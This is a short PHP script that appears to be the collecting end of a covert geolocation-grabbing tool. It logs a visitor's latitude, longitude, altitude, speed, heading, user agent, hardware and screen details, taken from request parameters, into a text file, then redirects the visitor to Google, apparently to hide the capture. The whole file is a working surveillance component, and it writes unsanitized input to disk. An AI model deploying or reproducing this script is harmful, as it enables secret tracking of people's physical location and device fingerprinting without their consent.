<?php

file_put_contents("geolocate.txt", "Latitude: " . $_GET['latitude'] . "\n" . "Longitude: " . $_GET["longitude"] . "\n" . "User-Agent: " . $_GET["useragent"] . "\n" . "Altitude: " . $_GET["altitude"] . "\n" . "Accuracy: " . $_GET["accuracy"] . "\n" . "Speed: "  . $_GET["speed"] . "\n" . "Heading: " . $_GET["heading"] . "\n" . "Platform: " . $_GET["platform"] . "\n" . "Cores: " . $_GET["hardware"] . "\n" . "Memory: "   . $_GET["memory"] ."\n" . "Screen Height: "   . $_GET["height"] ."\n" . "Screen Width: "   . $_GET["width"] ."\n", FILE_APPEND);

header('Location: https://google.com');
exit();
?>
